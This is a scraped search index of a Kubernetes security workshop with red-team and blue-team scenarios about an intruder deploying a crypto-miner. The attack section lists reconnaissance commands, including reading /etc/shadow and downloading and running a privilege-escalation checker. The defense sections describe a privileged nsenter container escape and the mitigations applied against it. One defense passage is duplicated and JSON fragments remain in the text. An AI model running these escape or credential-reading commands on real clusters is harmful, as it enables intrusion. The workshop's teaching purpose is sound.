Only perform security assessments against your own systems, or with written permission from the owners. Backstory Name: Red Opportunist Easy money via crypto-mining Uses automated scans of web IP space for specific issues Leverages off-the-shelf attacks Basic Kubernetes knowledge Motivations Red \u2019s intrusion-as-a-service provider compromises website and uploads a webshell Red gets the URL of the webshell and wants to deploy some crypto-miners Initial Access Red has been mining bitcoinero for a few months now, and it's starting to gain some value. To capitalize on this bubble, Red uses a service that sells shell access to expand the mining pool. To find the compromised website, run the following from your Cloud Shell terminal: ./check-email.sh Log into the URL in a browser, and you should be looking at a working web terminal. Thinking In Graphs Attacking a system is a problem-solving process similar to troubleshooting: Red begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned. The general process looks like this: Study In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, nmap is commonly used to enumerate IP networks. nikto , burp , and sqlmap are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as uname , winver , and netstat provide a wealth of information about their host OSes. Plan In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more. Attack Something In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate. Persist In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords. Win Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal. Getting Some Loot Since Red already has a shell on a compromised host (Thanks, Natoshi!), the process is fairly simple. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible: Let's become Red and try some basic information-gathering commands to get a feel for the environment: id uname -a cat /etc/lsb-release /etc/redhat-release ps -ef df -h netstat -nl Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container. Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running a basic Linux config auditor to see if it finds any obvious opportunities. Search a bit on https://www.exploit-db.com/ to see if there's easy public exploits for the kernel. cat /etc/shadow ls -l /home ls -l /root cd /tmp; curl http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard That's not getting us anywhere.

Now let's inspect our Kubernetes environment: env | grep -i kube curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version ls /var/run/secrets/kubernetes.io/serviceaccount We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API.

MISSION ACCOMPLISHED","title":"Getting Some Loot"},{"location":"scenario_1_defense/","text":"Free Compute: Scenario 1 Defense Backstory Name: Blue Overworked Can only do the bare minimum Uses defaults when configuring systems Usually gets blamed for stability or security issues Motivations Blue gets paged at 1am with an \u201curgent\u201d problem: the developers say the \u201cwebsite is slow\u201d Blue reluctantly agrees to take a \u201cquick look\u201d Blue wants desperately to get back to sleep. Zzz Defense Blue looks at the page with an unsurprising lack of details, and spends a few minutes getting the answer to exactly which website they are referring to that is underperforming. It's \"the one running in Kubernetes\", they said. Blue leverages their Cloud Shell terminal to begin the process of troubleshooting the issue. Identifying the Issue The first step is to determine the name for the web application deployment in question. From the terminal, Blue runs the following to see a listing of all pods in all namespaces : kubectl get pods --all-namespaces The cluster is relatively small in size, but it has a couple deployments that could be the site in question. The development team mentions performance is an issue, so Blue checks the current CPU and Memory usage with: kubectl top node and kubectl top pod --all-namespaces It appears that a suspcious deployment named bitcoinero is running, and its causing resource contention issues. Blue runs the following to see the pod's full configuration: kubectl get deployment -n prd bitcoinero -o yaml It was created very recently, but there are no ports listening, so this looks unlikely to be part of the website. Next, Blue grabs a consolidated listing of all images running in the cluster : kubectl get pods --all-namespaces -o jsonpath= {..image} | tr -s [[:space:]] \\n | sort -u Confirming the Foreign Workload Blue sends a message back to the developers asking for confirmation of the suspicious bitcoinero image, and they all agree they don't know who created the deployment . They also mention that someone accidentally deployed a nodePort for the production ops dashboard, and ask if Blue can delete it for them.

Could this be the same problem again? Identifying the Issue Let's run some basic checks again to see if we can find random workloads: kubectl get pods --all-namespaces There does not appear to be any unusual workloads running on our cluster. Just to be sure, let's check our cluster's resource consumption: kubectl top node and kubectl top pod --all-namespaces So far, everything looks normal. What gives? Hold on. We installed falco last time and it is throwing us alerts in StackDriver. In a new StackDriver window , let's run the query: resource.type= container resource.labels.container_name: falco jsonPayload.rule= Launch Privileged Container OR jsonPayload.rule= Terminal shell in container We're looking for container logs from falco where triggered rules are privileged containers or interactive shells. Huh. This is odd. A privileged alpine container, but no other information to go off of? What can kubernetes cluster logs tell us about this alpine container? In a new StackDriver window , let's run this query: resource.type=k8s_cluster protoPayload.request.spec.containers.image= alpine So, we see a few things: A create event that was authorized with the system:serviceaccount:dev:default serviceaccount in the dev namespace. A pod named r00t got created The pod command is nsenter --mount=/proc/1/ns/mnt -- /bin/bash The securityContext is privileged: true The hostPID is set to true This is not looking good. Can we see what this container did? In a new StackDriver window , let's search for this r00t container logs: resource.type= container resource.labels.pod_id:r00t Wow. We can see someone was running commands from this container. But wait, they can run docker commands? How can they talk to the docker on the host from the container? OH NO! They must have broken out of the container and by this point they're on the host! That bitcoinero container again must be what's causing slowness. But, they're trying to do something else. They tried to create a pod, but failed. So, they created a Service and an Endpoint. They must be trying to open a backdoor of some sort to get back in later. In cloud shell, let's check if those exist: kubectl -n kube-system get svc,ep That's one sneaky hacker, for sure. But, jokes on them, We're not using service mesh. Let's delete that service (the endpoint will be deleted too): kubectl -n kube-system delete svc/istio-mgmt But, I want to know how did they get in in the first place?!?!?! The create event authorized because of the dev:default serviceaccount. So, what is in dev namespace that led to someone taking over the entire host? kubectl -n dev get pods There is an app , a db , and a dashboard . Wait a second! Could it be an exposed dashboard? kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c dashboard kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c authproxy It is an exposed dashboard. That's how they got in. There is GET /webshell in authproxy logs with the source IP. We might want to revoke that serviceaccount token: kubectl -n dev delete $(kubectl -n dev get secret -o name| grep default) And perhaps disable the automatic mounting of serviceaccount tokens by setting automountServiceAccountToken: false in the pod spec, if the dashboard doesn't need it. But, how can we mitigate this further? The attacker ran a privileged container, which they shouldn't have been able to. So, we should block that. I remember a talk at KubeCon this week about Open-Policy-Agent/Gatekeeper that gets deployed as an admission controller. That should work because an admission controller is a piece of code that intercepts requests to the Kubernetes API server after the request is authenticated and authorized. So, we should set two policies: Deny privileged containers. Allow only the images we expect to have in dev and prd namespaces. First, let's apply Gatekeeper itself: kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2.yaml Second, let's apply the policies. If you receive an error about no matches for kind... in version ... , this means Gatekeeper has not kicked into gear yet. Wait a few seconds then re-apply policies: kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2-policies.yaml Let's see if this actually works by trying to run some containers that violate these policies. First, let's try to run privileged container: kubectl -n dev run ubuntu --image=ubuntu --privileged --restart=Never We see that Kubernetes denied this request for 2 reasons (not whitelisted image and privileged), as expected. Let's try running a non-whitelisted image: kubectl -n dev run alpine --image=alpine --restart=Never We see that Kubernetes rejected this request again due to image not being whitelisted/allowed, as expected. Can we still run pods that meet/satisfy the Gatekeeper policies? Let's find out: kubectl -n dev run ubuntu --image=ubuntu --restart=Never Yes, looks like we can run pods that satisfy the policies and requirements we set on our cluster. Even though we applied Falco and Gatekeeper, we should not continue to use this cluster since it has been compromised. We should create a new cluster and re-deploy our applications there once we've hardened and secured it enough.","title":"Scenario 2 Defense"},{"location":"scenario_2_defense/#persistence-scenario-2-defense","text":"","title":"Persistence: Scenario 2 Defense"},{"location":"scenario_2_defense/#backstory","text":"","title":"Backstory"},{"location":"scenario_2_defense/#name-blue","text":"Still overworked Still can only do the bare minimum Uses the defaults when configuring systems Usually gets blamed for stability or security issues","title":"Name: Blue"},{"location":"scenario_2_defense/#motivations","text":"A week after the first incident, Blue gets paged at 3am because \u201cwebsite is slow again\u201d.

Just to be sure, let's check our cluster's resource consumption: kubectl top node and kubectl top pod --all-namespaces So far, everything looks normal. What gives? Hold on. We installed falco last time and it is throwing us alerts in StackDriver. In a new StackDriver window , let's run the query: resource.type= container resource.labels.container_name: falco jsonPayload.rule= Launch Privileged Container OR jsonPayload.rule= Terminal shell in container We're looking for container logs from falco where triggered rules are privileged containers or interactive shells. Huh. This is odd. A privileged alpine container, but no other information to go off of? What can kubernetes cluster logs tell us about this alpine container? In a new StackDriver window , let's run this query: resource.type=k8s_cluster protoPayload.request.spec.containers.image= alpine So, we see a few things: A create event that was authorized with the system:serviceaccount:dev:default serviceaccount in the dev namespace. A pod named r00t got created The pod command is nsenter --mount=/proc/1/ns/mnt -- /bin/bash The securityContext is privileged: true The hostPID is set to true This is not looking good. Can we see what this container did? In a new StackDriver window , let's search for this r00t container logs: resource.type= container resource.labels.pod_id:r00t Wow. We can see someone was running commands from this container. But wait, they can run docker commands? How can they talk to the docker on the host from the container? OH NO! They must have broken out of the container and by this point they're on the host! That bitcoinero container again must be what's causing slowness. But, they're trying to do something else. They tried to create a pod, but failed. So, they created a Service and an Endpoint. They must be trying to open a backdoor of some sort to get back in later. In cloud shell, let's check if those exist: kubectl -n kube-system get svc,ep That's one sneaky hacker, for sure. But, jokes on them, We're not using service mesh. Let's delete that service (the endpoint will be deleted too): kubectl -n kube-system delete svc/istio-mgmt But, I want to know how did they get in in the first place?!?!?! The create event authorized because of the dev:default serviceaccount. So, what is in dev namespace that led to someone taking over the entire host? kubectl -n dev get pods There is an app , a db , and a dashboard . Wait a second! Could it be an exposed dashboard? kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c dashboard kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c authproxy It is an exposed dashboard. That's how they got in. There is GET /webshell in authproxy logs with the source IP. We might want to revoke that serviceaccount token: kubectl -n dev delete $(kubectl -n dev get secret -o name| grep default) And perhaps disable the automatic mounting of serviceaccount tokens by setting automountServiceAccountToken: false in the pod spec, if the dashboard doesn't need it. But, how can we mitigate this further? The attacker ran a privileged container, which they shouldn't have been able to. So, we should block that. I remember a talk at KubeCon this week about Open-Policy-Agent/Gatekeeper that gets deployed as an admission controller. That should work because an admission controller is a piece of code that intercepts requests to the Kubernetes API server after the request is authenticated and authorized. So, we should set two policies: Deny privileged containers. Allow only the images we expect to have in dev and prd namespaces. First, let's apply Gatekeeper itself: kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2.yaml Second, let's apply the policies. If you receive an error about no matches for kind... in version ... , this means Gatekeeper has not kicked into gear yet. Wait a few seconds then re-apply policies: kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2-policies.yaml Let's see if this actually works by trying to run some containers that violate these policies. First, let's try to run privileged container: kubectl -n dev run ubuntu --image=ubuntu --privileged --restart=Never We see that Kubernetes denied this request for 2 reasons (not whitelisted image and privileged), as expected. Let's try running a non-whitelisted image: kubectl -n dev run alpine --image=alpine --restart=Never We see that Kubernetes rejected this request again due to image not being whitelisted/allowed, as expected. Can we still run pods that meet/satisfy the Gatekeeper policies? Let's find out: kubectl -n dev run ubuntu --image=ubuntu --restart=Never Yes, looks like we can run pods that satisfy the policies and requirements we set on our cluster. Even though we applied Falco and Gatekeeper, we should not continue to use this cluster since it has been compromised. We should create a new cluster and re-deploy our applications there once we've hardened and secured it enough.","title":"Identifying the Issue"}]}
